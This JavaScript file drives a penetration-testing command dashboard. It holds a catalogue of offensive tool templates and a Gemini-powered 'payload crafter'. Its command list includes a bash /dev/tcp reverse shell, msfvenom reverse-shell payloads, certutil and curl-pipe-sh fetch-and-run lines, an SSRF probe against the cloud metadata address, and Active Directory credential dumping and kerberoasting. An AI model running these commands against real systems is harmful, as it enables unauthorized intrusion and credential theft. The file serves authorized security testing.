const KEYS = {
  target: 'hub_target',
  ip: 'hub_ip',
  selector: 'hub_selector',
  wordlist: 'hub_wordlist',
  favs: 'hub_favs',
  geminiApi: 'hub_gemini_api'
};

let geminiApiKey = localStorage.getItem(KEYS.geminiApi) || '';

const tools = [
  { id: 'ai_1', category: '✨ AI Assistants', name: 'Payload Crafter', badge: 'Gemini', desc: 'Generate payload/one-liner from natural language.', isAI: true, aiType: 'builder', tags: ['ai'] },
  { id: 'ai_2', category: '✨ AI Assistants', name: 'Recon Analyzer', badge: 'Gemini', desc: 'Analyze output and suggest next actions.', isAI: true, aiType: 'analyzer', tags: ['ai'] },

  { id: 'pr_1', category: 'Passive Recon', name: 'Subfinder', badge: 'Domains', desc: 'Passive subdomain enumeration.', cmd: 'subfinder -d [TARGET] -all -silent | anew subs.txt', tags: ['passive'] },
  { id: 'pr_2', category: 'Passive Recon', name: 'Amass Passive', badge: 'Domains', desc: 'Asset discovery using passive intel.', cmd: 'amass enum -passive -d [TARGET] | anew subs.txt', tags: ['passive'] },
  { id: 'pr_3', category: 'Passive Recon', name: 'assetfinder', badge: 'Domains', desc: 'Fast subdomain gathering.', cmd: 'assetfinder --subs-only [TARGET] | anew subs.txt', tags: ['passive'] },
  { id: 'pr_4', category: 'Passive Recon', name: 'findomain', badge: 'Domains', desc: 'Subdomain enumeration with resolver checks.', cmd: 'findomain -t [TARGET] -q | anew subs.txt', tags: ['passive'] },
  { id: 'pr_5', category: 'Passive Recon', name: 'crt.sh', badge: 'TLS', desc: 'Certificate transparency search.', cmd: 'curl -s "https://crt.sh/?q=%25.[TARGET]&output=json" | jq -r ".[].name_value" | sed "s/*\.//" | sort -u | anew subs.txt', tags: ['passive'] },
  { id: 'pr_6', category: 'Passive Recon', name: 'waybackurls', badge: 'Archive', desc: 'Collect archived URLs.', cmd: 'echo [TARGET] | waybackurls | sort -u | anew urls_wayback.txt', tags: ['passive'] },
  { id: 'pr_7', category: 'Passive Recon', name: 'gau', badge: 'Archive', desc: 'Fetch URLs from multiple archives.', cmd: 'gau [TARGET] --threads 10 | sort -u | anew urls_gau.txt', tags: ['passive'] },

  { id: 'dns_1', category: 'DNS & Resolution', name: 'puredns resolve', badge: 'DNS', desc: 'Resolve subdomains using resolvers list.', cmd: 'puredns resolve subs.txt -r resolvers.txt -w resolved.txt', tags: ['active'] },
  { id: 'dns_2', category: 'DNS & Resolution', name: 'dnsx', badge: 'DNS', desc: 'A/AAAA/CNAME response checks.', cmd: 'dnsx -l subs.txt -a -resp -silent -o dnsx_resolved.txt', tags: ['active'] },
  { id: 'dns_3', category: 'DNS & Resolution', name: 'massdns', badge: 'DNS', desc: 'High performance DNS resolver.', cmd: 'massdns -r resolvers.txt -t A -o S -w massdns.out subs.txt', tags: ['active'] },
  { id: 'dns_4', category: 'DNS & Resolution', name: 'Zone Transfer', badge: 'AXFR', desc: 'Attempt AXFR transfer.', cmd: 'dig axfr @[IP] [TARGET]', tags: ['active'] },

  { id: 'web_1', category: 'Web Probing', name: 'httpx full probe', badge: 'HTTP', desc: 'Detect status/title/tech.', cmd: 'cat resolved.txt | httpx -status-code -title -tech-detect -server -follow-redirects -silent | anew live_web.txt', tags: ['active'] },
  { id: 'web_2', category: 'Web Probing', name: 'katana', badge: 'Crawler', desc: 'Depth crawl endpoints.', cmd: 'katana -u https://[TARGET] -d 5 -silent -jc -o katana_urls.txt', tags: ['active'] },
  { id: 'web_3', category: 'Web Probing', name: 'hakrawler', badge: 'Crawler', desc: 'Quick crawl links and params.', cmd: 'echo https://[TARGET] | hakrawler -depth 3 -plain | anew hakrawler_urls.txt', tags: ['active'] },

  { id: 'port_1', category: 'Port Scanning', name: 'naabu top ports', badge: 'Ports', desc: 'Fast port scanner.', cmd: 'naabu -host [TARGET] -top-ports 1000 -silent | anew ports.txt', tags: ['active'] },
  { id: 'port_2', category: 'Port Scanning', name: 'nmap full tcp', badge: 'Nmap', desc: 'Full TCP scan + scripts.', cmd: 'nmap -sV -sC -p- -T4 [TARGET] -oA nmap_full_tcp', tags: ['active'] },
  { id: 'port_3', category: 'Port Scanning', name: 'nmap vuln scripts', badge: 'Nmap', desc: 'NSE vuln checks.', cmd: 'nmap -sV --script vuln [TARGET] -oN nmap_vuln.txt', tags: ['active'] },
  { id: 'port_4', category: 'Port Scanning', name: 'rustscan', badge: 'Rustscan', desc: 'Fast scan and pass to Nmap.', cmd: 'rustscan -a [TARGET] -- -sV -sC -oN rustscan.txt', tags: ['active'] },

  { id: 'vuln_1', category: 'Vulnerability Scanning', name: 'nuclei critical/high', badge: 'Nuclei', desc: 'Critical/high templates.', cmd: 'nuclei -l live_web.txt -s critical,high -o nuclei_high.txt', tags: ['active'] },
  { id: 'vuln_2', category: 'Vulnerability Scanning', name: 'nuclei CVE', badge: 'Nuclei', desc: 'CVE specific scan.', cmd: 'nuclei -l live_web.txt -tags cve -o nuclei_cves.txt', tags: ['active'] },
  { id: 'vuln_3', category: 'Vulnerability Scanning', name: 'nuclei exposures', badge: 'Nuclei', desc: 'Token/panel/config exposures.', cmd: 'nuclei -l live_web.txt -tags exposure,token,panel,config -o nuclei_exposure.txt', tags: ['active'] },
  { id: 'vuln_4', category: 'Vulnerability Scanning', name: 'nikto', badge: 'Web', desc: 'Classic web scan.', cmd: 'nikto -h https://[TARGET] -C all', tags: ['active'] },

  { id: 'fuzz_1', category: 'Directory Fuzzing', name: 'ffuf dirs', badge: 'Fuzzer', desc: 'Directory brute force.', cmd: 'ffuf -w [WORDLIST] -u https://[TARGET]/FUZZ -mc 200,204,301,302,307,401,403 -o ffuf_dirs.json', tags: ['active'] },
  { id: 'fuzz_2', category: 'Directory Fuzzing', name: 'ffuf params', badge: 'Fuzzer', desc: 'Parameter discovery.', cmd: 'ffuf -w [WORDLIST] -u "https://[TARGET]/index.php?FUZZ=test" -fs 0 -o ffuf_params.json', tags: ['active'] },
  { id: 'fuzz_3', category: 'Directory Fuzzing', name: 'gobuster dirs', badge: 'Fuzzer', desc: 'Directory bruteforce.', cmd: 'gobuster dir -u https://[TARGET] -w [WORDLIST] -t 50 -x php,txt,html,bak', tags: ['active'] },
  { id: 'fuzz_4', category: 'Directory Fuzzing', name: 'feroxbuster', badge: 'Fuzzer', desc: 'Recursive content discovery.', cmd: 'feroxbuster -u https://[TARGET] -w [WORDLIST] -x php,html,js,txt,json -t 50', tags: ['active'] },
  { id: 'fuzz_5', category: 'Directory Fuzzing', name: 'arjun', badge: 'Params', desc: 'Hidden parameter discovery.', cmd: 'arjun -u https://[TARGET]/endpoint -m GET,POST -oT arjun_params.txt', tags: ['active'] },

  { id: 'exp_1', category: 'Web Exploitation', name: 'sqlmap batch', badge: 'SQLi', desc: 'Automated SQL injection.', cmd: 'sqlmap -u "https://[TARGET]/item.php?id=1" --batch --risk=2 --level=3 --dbs', tags: ['active'] },
  { id: 'exp_2', category: 'Web Exploitation', name: 'ghauri', badge: 'SQLi', desc: 'Alternative SQLi tool.', cmd: 'ghauri -u "https://[TARGET]/item.php?id=1" --dbs --batch', tags: ['active'] },
  { id: 'exp_3', category: 'Web Exploitation', name: 'dalfox url', badge: 'XSS', desc: 'Find XSS on URL params.', cmd: 'dalfox url "https://[TARGET]/?q=test" -b [SELECTOR]', tags: ['active'] },
  { id: 'exp_4', category: 'Web Exploitation', name: 'kxss reflections', badge: 'XSS', desc: 'Identify reflected points.', cmd: 'cat urls_gau.txt | kxss | tee kxss_hits.txt', tags: ['active'] },
  { id: 'exp_5', category: 'Web Exploitation', name: 'commix', badge: 'CMDi', desc: 'Command injection testing.', cmd: 'commix --url="https://[TARGET]/vuln.php?cmd=INJECT_HERE" --batch', tags: ['active'] },

  { id: 'api_1', category: 'API & GraphQL', name: 'kiterunner', badge: 'API', desc: 'API route bruteforce.', cmd: 'kr scan https://[TARGET] -w routes-large.kite -x 10 -j api_scan.json', tags: ['active'] },
  { id: 'api_2', category: 'API & GraphQL', name: 'graphql introspection', badge: 'GraphQL', desc: 'Test introspection query.', cmd: 'curl -s https://[TARGET]/graphql -H "Content-Type: application/json" --data "{\"query\":\"{__schema{types{name}}}\"}"', tags: ['active'] },
  { id: 'api_3', category: 'API & GraphQL', name: 'jwt_tool none', badge: 'JWT', desc: 'JWT none alg check.', cmd: 'python3 jwt_tool.py -I -pc none -t https://[TARGET]/api', tags: ['active'] },

  { id: 'oidc_1', category: 'Identity & OIDC', name: 'OIDC discovery', badge: 'OIDC', desc: 'Check OIDC well-known endpoint.', cmd: 'curl -s https://[TARGET]/.well-known/openid-configuration | jq .', tags: ['active'] },
  { id: 'oidc_2', category: 'Identity & OIDC', name: 'DCR SSRF test', badge: 'OIDC', desc: 'Dynamic client registration SSRF check.', cmd: 'curl -X POST https://[TARGET]/register -H "Content-Type: application/json" -d "{\"redirect_uris\":[\"https://[IP]/callback\"],\"logo_uri\":\"http://169.254.169.254/latest/meta-data/\"}"', tags: ['active'] },

  { id: 'cloud_1', category: 'Cloud & Secrets', name: 'trufflehog', badge: 'Secrets', desc: 'Scan git repo secrets.', cmd: 'trufflehog github --repo https://github.com/[TARGET]', tags: ['passive'] },
  { id: 'cloud_2', category: 'Cloud & Secrets', name: 's3scanner', badge: 'AWS', desc: 'Scan S3 bucket exposure.', cmd: 's3scanner scan --bucket [TARGET]', tags: ['active'] },
  { id: 'cloud_3', category: 'Cloud & Secrets', name: 'gitleaks', badge: 'Secrets', desc: 'Detect sensitive keys in codebase.', cmd: 'gitleaks detect -s . -v', tags: ['offline'] },

  { id: 'ad_1', category: 'Active Directory', name: 'bloodhound python', badge: 'AD', desc: 'Collect AD graph data.', cmd: 'python3 bloodhound.py -u [SELECTOR] -p "Password" -d [TARGET] -ns [IP] -c All', tags: ['active'] },
  { id: 'ad_2', category: 'Active Directory', name: 'kerbrute userenum', badge: 'AD', desc: 'AD username enumeration.', cmd: 'kerbrute userenum -d [TARGET] --dc [IP] [WORDLIST]', tags: ['active'] },
  { id: 'ad_3', category: 'Active Directory', name: 'impacket secretsdump', badge: 'AD', desc: 'Dump creds/hashes.', cmd: 'impacket-secretsdump [TARGET]/[SELECTOR]:Password@[IP]', tags: ['active'] },
  { id: 'ad_4', category: 'Active Directory', name: 'GetUserSPNs', badge: 'AD', desc: 'Kerberoasting tickets.', cmd: 'impacket-GetUserSPNs -request -dc-ip [IP] [TARGET]/[SELECTOR]', tags: ['active'] },
  { id: 'ad_5', category: 'Active Directory', name: 'GetNPUsers', badge: 'AD', desc: 'AS-REP roasting.', cmd: 'impacket-GetNPUsers -dc-ip [IP] -request -format hashcat [TARGET]/ -usersfile [WORDLIST]', tags: ['active'] },
  { id: 'ad_6', category: 'Active Directory', name: 'netexec smb', badge: 'AD', desc: 'SMB spray and share enum.', cmd: 'nxc smb [IP]/24 -u [SELECTOR] -p "Password" --shares', tags: ['active'] },

  { id: 'pe_1', category: 'Privilege Escalation', name: 'linpeas', badge: 'PrivEsc', desc: 'Linux local escalation checks.', cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh', tags: ['active'] },
  { id: 'pe_2', category: 'Privilege Escalation', name: 'winpeas', badge: 'PrivEsc', desc: 'Windows local escalation checks.', cmd: 'certutil.exe -urlcache -f http://[IP]:8000/winpeas.exe winpeas.exe && winpeas.exe', tags: ['active'] },
  { id: 'pe_3', category: 'Privilege Escalation', name: 'suid search', badge: 'Linux', desc: 'Find SUID binaries.', cmd: 'find / -perm -4000 -type f 2>/dev/null', tags: ['active'] },

  { id: 'sh_1', category: 'Exploitation & Shells', name: 'msfvenom linux', badge: 'Payload', desc: 'Linux reverse shell ELF.', cmd: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=[IP] LPORT=4444 -f elf -o shell.elf', tags: ['offline'] },
  { id: 'sh_2', category: 'Exploitation & Shells', name: 'msfvenom windows', badge: 'Payload', desc: 'Windows reverse shell EXE.', cmd: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f exe -o rev.exe', tags: ['offline'] },
  { id: 'sh_3', category: 'Exploitation & Shells', name: 'bash reverse shell', badge: 'Payload', desc: 'Classic bash reverse shell.', cmd: "bash -c 'bash -i >& /dev/tcp/[IP]/4444 0>&1'", tags: ['offline'] },
  { id: 'sh_4', category: 'Exploitation & Shells', name: 'nc listener', badge: 'Listener', desc: 'Start listener for reverse shells.', cmd: 'nc -lvnp 4444', tags: ['offline'] },

  { id: 'mob_1', category: 'Mobile Testing', name: 'adb devices', badge: 'Android', desc: 'List connected Android devices.', cmd: 'adb devices', tags: ['offline'] },
  { id: 'mob_2', category: 'Mobile Testing', name: 'apktool decode', badge: 'Android', desc: 'Decode APK content.', cmd: 'apktool d app.apk -o app_decoded', tags: ['offline'] },
  { id: 'mob_3', category: 'Mobile Testing', name: 'frida-ps', badge: 'Frida', desc: 'List running app processes.', cmd: 'frida-ps -Uai', tags: ['active'] },

  { id: 'wf_1', category: 'One-Liner Chains', name: 'Subdomain to nuclei chain', badge: 'Chain', desc: 'Full recon chain.', cmd: 'subfinder -d [TARGET] -silent | puredns resolve -r resolvers.txt | httpx -silent | nuclei -t nuclei-templates/ -o chain_nuclei.txt', tags: ['active'] },
  { id: 'wf_2', category: 'One-Liner Chains', name: 'Archive to XSS chain', badge: 'Chain', desc: 'URL harvest + reflection + XSS.', cmd: 'gau [TARGET] | kxss | grep -oP "^URL: \\K\\S+" | dalfox pipe -b [SELECTOR]', tags: ['active'] }
];

let state = {
  target: '', ip: '', selector: '', wordlist: '', search: '', category: 'All Tools', favorites: [], filterFav: false, filterTag: null, filterOffline: false, tools: []
};

let chart = null;

const byId = id => document.getElementById(id);
const debounce = (f, w) => { let t; return (...a) => { clearTimeout(t); t = setTimeout(() => f(...a), w); }; };

function el(tag, attrs = {}, ...children) {
  const node = document.createElement(tag);
  for (const [k, v] of Object.entries(attrs)) {
    if (k.startsWith('on')) node.addEventListener(k.slice(2).toLowerCase(), v);
    else if (k === 'className') node.className = v;
    else if (k === 'textContent') node.textContent = v;
    else if (v !== undefined && v !== null) node.setAttribute(k, v);
  }
  children.forEach(c => node.append(c));
  return node;
}

function toast(msg, error = false) {
  const t = byId('toast');
  byId('toastMsg').textContent = msg;
  t.className = `fixed bottom-5 right-5 font-bold px-4 py-2 rounded transform transition-all z-50 flex items-center shadow-lg fade-in ${error ? 'bg-cyberalert text-white' : 'bg-cyberemerald text-black'}`;
  t.classList.remove('translate-y-24', 'opacity-0');
  setTimeout(() => t.classList.add('translate-y-24', 'opacity-0'), 2300);
}

async function copy(text) {
  try {
    if (navigator.clipboard && window.isSecureContext) await navigator.clipboard.writeText(text);
    else throw new Error('fallback');
  } catch {
    const ta = document.createElement('textarea');
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    ta.remove();
  }
  toast('Command copied');
}

function replaceVars(cmd) {
  return (cmd || '')
    .replace(/\[TARGET\]/g, state.target || '[TARGET]')
    .replace(/\[IP\]/g, state.ip || '[IP]')
    .replace(/\[SELECTOR\]/g, state.selector || '[SELECTOR]')
    .replace(/\[WORDLIST\]/g, state.wordlist || '[WORDLIST]');
}

function saveState() {
  localStorage.setItem(KEYS.target, state.target);
  localStorage.setItem(KEYS.ip, state.ip);
  localStorage.setItem(KEYS.selector, state.selector);
  localStorage.setItem(KEYS.wordlist, state.wordlist);
  localStorage.setItem(KEYS.favs, JSON.stringify(state.favorites));
}

function loadState() {
  state.target = localStorage.getItem(KEYS.target) || '';
  state.ip = localStorage.getItem(KEYS.ip) || '';
  state.selector = localStorage.getItem(KEYS.selector) || '';
  state.wordlist = localStorage.getItem(KEYS.wordlist) || '';
  state.favorites = JSON.parse(localStorage.getItem(KEYS.favs) || '[]');
  byId('inputTarget').value = state.target;
  byId('inputIP').value = state.ip;
  byId('inputSelector').value = state.selector;
  byId('inputWordlist').value = state.wordlist;
}

function updateStatus() {
  const ai = geminiApiKey ? 'AI: configured ✅' : 'AI: not configured ⚠';
  byId('statusBar').textContent = `${ai} | Commands: ${state.tools.length} | Ctrl+K for search`;
}

function resetState() {
  state.target = ''; state.ip = ''; state.selector = ''; state.wordlist = ''; state.search = '';
  state.filterFav = false; state.filterTag = null; state.filterOffline = false;
  ['inputTarget', 'inputIP', 'inputSelector', 'inputWordlist', 'inputSearch'].forEach(id => byId(id).value = '');
  byId('filterFavBtn').classList.remove('bg-yellow-500/20', 'text-yellow-400', 'border-yellow-500');
  byId('filterOfflineBtn').classList.remove('bg-cybersky/20', 'text-cybersky', 'border-cybersky');
  document.querySelectorAll('.filter-tag').forEach(b => b.classList.remove('bg-cybersky/20', 'text-cybersky', 'border-cybersky'));
  saveState();
  render();
}

function icon(cat) {
  return ({ 'All Tools': '⚡', 'Passive Recon': '📡', 'DNS & Resolution': '🌍', 'Web Probing': '🕸️', 'Port Scanning': '🚪', 'Vulnerability Scanning': '☢️', 'Directory Fuzzing': '📚', 'Web Exploitation': '💉', 'API & GraphQL': '🧩', 'Identity & OIDC': '🛂', 'Cloud & Secrets': '☁️', 'Active Directory': '🏰', 'Privilege Escalation': '⬆️', 'Exploitation & Shells': '💥', 'Mobile Testing': '📱', 'One-Liner Chains': '⛓️', '✨ AI Assistants': '✨' }[cat] || '🔧');
}

function renderSidebar() {
  const nav = byId('categoryNav');
  nav.innerHTML = '';
  const categories = ['All Tools', ...new Set(state.tools.map(t => t.category))];
  categories.forEach(cat => {
    const active = state.category === cat;
    nav.appendChild(el('button', {
      className: `w-full text-left px-4 py-2 text-sm rounded ${active ? 'bg-cybersky/10 text-cybersky border-l-2 border-cybersky font-bold' : 'text-slate-400 hover:bg-slate-800/50 hover:text-white'}`,
      onClick: () => {
        state.category = cat;
        byId('overviewSection').classList.toggle('hidden', cat !== 'All Tools');
        renderSidebar();
        render();
        if (window.innerWidth < 768) toggleSidebar();
      }
    }, `${icon(cat)} ${cat}`));
  });
}

function toggleFavorite(id) {
  const i = state.favorites.indexOf(id);
  if (i > -1) state.favorites.splice(i, 1);
  else state.favorites.push(id);
  saveState();
  render();
}

function buildToolCard(t) {
  const final = replaceVars(t.cmd);
  const fav = state.favorites.includes(t.id);
  const card = el('div', { className: 'bg-cybercard rounded-lg p-5 neon-border flex flex-col gap-3 fade-in' });
  card.append(
    el('div', { className: 'flex justify-between gap-3' },
      el('div', {},
        el('h3', { className: 'text-white font-bold', textContent: t.name }),
        el('span', { className: 'inline-block mt-1 px-2 py-0.5 bg-slate-800 text-cybersky text-[10px] uppercase font-bold rounded', textContent: t.badge })
      ),
      el('button', { className: `${fav ? 'text-yellow-400' : 'text-slate-500'} text-lg`, textContent: fav ? '⭐' : '☆', onClick: () => toggleFavorite(t.id) })
    ),
    el('p', { className: 'text-slate-400 text-xs', textContent: t.desc })
  );

  const term = el('div', { className: 'terminal-box p-3 rounded relative' });
  term.append(
    el('button', { className: 'copy-btn absolute top-2 right-2 bg-slate-800 hover:bg-cybersky hover:text-black text-white p-1 rounded', textContent: '📋', onClick: () => copy(final) }),
    el('code', { textContent: `$ ${final}` })
  );
  card.append(term);
  return card;
}

function buildAICard(t) {
  const card = el('div', { className: 'bg-cybercard rounded-lg p-5 neon-border flex flex-col gap-3 col-span-1 xl:col-span-2 fade-in' });
  const input = el('textarea', { className: 'input-field min-h-[80px]', placeholder: t.aiType === 'builder' ? 'Generate a payload for...' : 'Paste scanner output...' });
  const out = el('div', { className: 'terminal-box p-3 rounded whitespace-pre-wrap min-h-[88px]', textContent: 'Awaiting instructions...' });
  const btn = el('button', { className: 'chip w-full md:w-auto', textContent: t.aiType === 'builder' ? '✨ Craft Payload' : '✨ Analyze Output', onClick: () => runAI(t.aiType, input, out, btn) });
  card.append(el('h3', { className: 'text-lg text-transparent bg-clip-text bg-gradient-to-r from-cybersky to-cyberemerald font-bold', textContent: `✨ ${t.name}` }), el('p', { className: 'text-slate-400 text-xs', textContent: t.desc }), input, btn, out);
  return card;
}

async function runAI(type, input, out, btn) {
  if (!geminiApiKey) {
    toast('Please set Gemini API key in AI Config first', true);
    return;
  }
  if (!input.value.trim()) return;

  btn.disabled = true;
  const old = btn.textContent;
  btn.textContent = '✨ Processing...';
  out.textContent = 'Thinking...';

  const sys = type === 'builder'
    ? 'You are a senior offensive security engineer. Return only one raw command, no markdown.'
    : 'You are a senior penetration tester. Summarize findings and provide 2-3 exact next commands.';

  try {
    const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${geminiApiKey}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ contents: [{ parts: [{ text: input.value }] }], systemInstruction: { parts: [{ text: sys }] } })
    });
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const data = await res.json();
    let text = data?.candidates?.[0]?.content?.parts?.[0]?.text || 'No output';
    if (type === 'builder') {
      text = text.replace(/^```[a-z]*\n/i, '').replace(/\n```$/i, '');
      out.textContent = `$ ${text}`;
    } else {
      out.textContent = text;
    }
  } catch (e) {
    out.textContent = `Error: ${e.message}`;
  } finally {
    btn.disabled = false;
    btn.textContent = old;
  }
}

function render() {
  updateStatus();
  const grid = byId('toolsGrid');
  const empty = byId('emptyState');
  byId('currentCategoryTitle').textContent = state.category;

  const list = state.tools.filter(t => {
    const byCat = state.category === 'All Tools' || t.category === state.category;
    const hay = `${t.name} ${t.desc} ${t.cmd || ''} ${(t.tags || []).join(' ')}`.toLowerCase();
    const bySearch = hay.includes(state.search);
    const byFav = !state.filterFav || state.favorites.includes(t.id);
    const byTag = !state.filterTag || (t.tags || []).includes(state.filterTag);
    const byOffline = !state.filterOffline || (t.tags || []).includes('offline');
    return byCat && bySearch && byFav && byTag && byOffline;
  });

  byId('toolCountLabel').textContent = `${list.length} Commands Ready`;
  grid.innerHTML = '';
  if (!list.length) {
    empty.classList.remove('hidden');
    empty.classList.add('flex');
    return;
  }
  empty.classList.add('hidden');
  empty.classList.remove('flex');
  list.forEach(t => grid.appendChild(t.isAI ? buildAICard(t) : buildToolCard(t)));
}

function chartData() {
  const count = {};
  state.tools.forEach(t => { if (!t.isAI) count[t.category] = (count[t.category] || 0) + 1; });
  return {
    labels: Object.keys(count),
    datasets: [{ data: Object.values(count), backgroundColor: ['#38bdf8', '#10b981', '#f43f5e', '#a855f7', '#f59e0b', '#14b8a6', '#8b5cf6', '#ec4899', '#f97316', '#0ea5e9'], borderWidth: 1, borderColor: '#020617' }]
  };
}

function initChart() {
  if (!window.Chart) {
    toast('Chart.js unavailable; chart disabled', true);
    return;
  }
  chart = new Chart(byId('arsenalChart').getContext('2d'), { type: 'doughnut', data: chartData(), options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { position: 'right', labels: { color: '#cbd5e1', font: { size: 10 } } } }, cutout: '72%' } });
}

function updateChart() {
  if (!chart) return;
  chart.data = chartData();
  chart.update();
}

function validTool(t) {
  if (!t || typeof t.id !== 'string' || typeof t.category !== 'string' || typeof t.name !== 'string' || typeof t.desc !== 'string' || !Array.isArray(t.tags)) return false;
  if (!t.isAI && typeof t.cmd !== 'string') return false;
  return true;
}

function toggleSidebar() {
  byId('sidebar').classList.toggle('-translate-x-full');
  byId('mobileOverlay').classList.toggle('hidden');
}

function initEvents() {
  const onInput = debounce((k, v) => { state[k] = v; saveState(); render(); }, 200);
  byId('inputTarget').addEventListener('input', e => onInput('target', e.target.value.trim()));
  byId('inputIP').addEventListener('input', e => onInput('ip', e.target.value.trim()));
  byId('inputSelector').addEventListener('input', e => onInput('selector', e.target.value.trim()));
  byId('inputWordlist').addEventListener('input', e => onInput('wordlist', e.target.value.trim()));
  byId('inputSearch').addEventListener('input', e => onInput('search', e.target.value.toLowerCase()));

  byId('openSidebarBtn').addEventListener('click', toggleSidebar);
  byId('closeSidebarBtn').addEventListener('click', toggleSidebar);
  byId('mobileOverlay').addEventListener('click', toggleSidebar);

  const openModal = () => {
    byId('apiKeyInput').value = geminiApiKey;
    byId('settingsModal').classList.remove('hidden');
    byId('settingsModal').classList.add('flex');
  };
  const closeModal = () => {
    byId('settingsModal').classList.add('hidden');
    byId('settingsModal').classList.remove('flex');
  };
  byId('openSettingsBtn').addEventListener('click', openModal);
  byId('openSettingsBtnMobile').addEventListener('click', openModal);
  byId('closeSettings').addEventListener('click', closeModal);
  byId('saveSettings').addEventListener('click', () => {
    geminiApiKey = byId('apiKeyInput').value.trim();
    localStorage.setItem(KEYS.geminiApi, geminiApiKey);
    closeModal();
    updateStatus();
    toast('AI configuration saved');
  });

  byId('filterFavBtn').addEventListener('click', e => {
    state.filterFav = !state.filterFav;
    e.target.classList.toggle('bg-yellow-500/20');
    e.target.classList.toggle('text-yellow-400');
    e.target.classList.toggle('border-yellow-500');
    render();
  });

  document.querySelectorAll('.filter-tag').forEach(btn => btn.addEventListener('click', e => {
    const tag = e.target.dataset.tag;
    if (state.filterTag === tag) {
      state.filterTag = null;
      e.target.classList.remove('bg-cybersky/20', 'text-cybersky', 'border-cybersky');
    } else {
      document.querySelectorAll('.filter-tag').forEach(x => x.classList.remove('bg-cybersky/20', 'text-cybersky', 'border-cybersky'));
      state.filterTag = tag;
      e.target.classList.add('bg-cybersky/20', 'text-cybersky', 'border-cybersky');
    }
    render();
  }));

  byId('filterOfflineBtn').addEventListener('click', e => {
    state.filterOffline = !state.filterOffline;
    e.target.classList.toggle('bg-cybersky/20');
    e.target.classList.toggle('text-cybersky');
    e.target.classList.toggle('border-cybersky');
    render();
  });

  byId('clearFiltersBtn').addEventListener('click', resetState);
  byId('btnResetState').addEventListener('click', resetState);

  byId('btnExport').addEventListener('click', () => {
    const payload = { tools: state.tools, exportedAt: new Date().toISOString() };
    const a = el('a', { href: `data:text/json;charset=utf-8,${encodeURIComponent(JSON.stringify(payload, null, 2))}`, download: 'arsenal_config.json' });
    a.click();
  });

  byId('btnImport').addEventListener('change', e => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = ev => {
      try {
        const parsed = JSON.parse(ev.target.result);
        const arr = Array.isArray(parsed) ? parsed : parsed.tools;
        if (!Array.isArray(arr)) throw new Error('Invalid JSON payload');
        const valid = arr.filter(validTool);
        if (!valid.length) throw new Error('No valid tools found');
        state.tools = valid;
        state.category = 'All Tools';
        renderSidebar();
        render();
        updateChart();
        toast(`Imported ${valid.length} commands`);
      } catch (err) {
        toast(`Import failed: ${err.message}`, true);
      }
    };
    reader.readAsText(file);
  });

  document.addEventListener('keydown', e => {
    if (e.ctrlKey && e.key.toLowerCase() === 'k') {
      e.preventDefault();
      byId('inputSearch').focus();
    }
  });
}

function init() {
  loadState();
  state.tools = [...tools];
  renderSidebar();
  initChart();
  initEvents();
  render();
}

window.addEventListener('load', init);
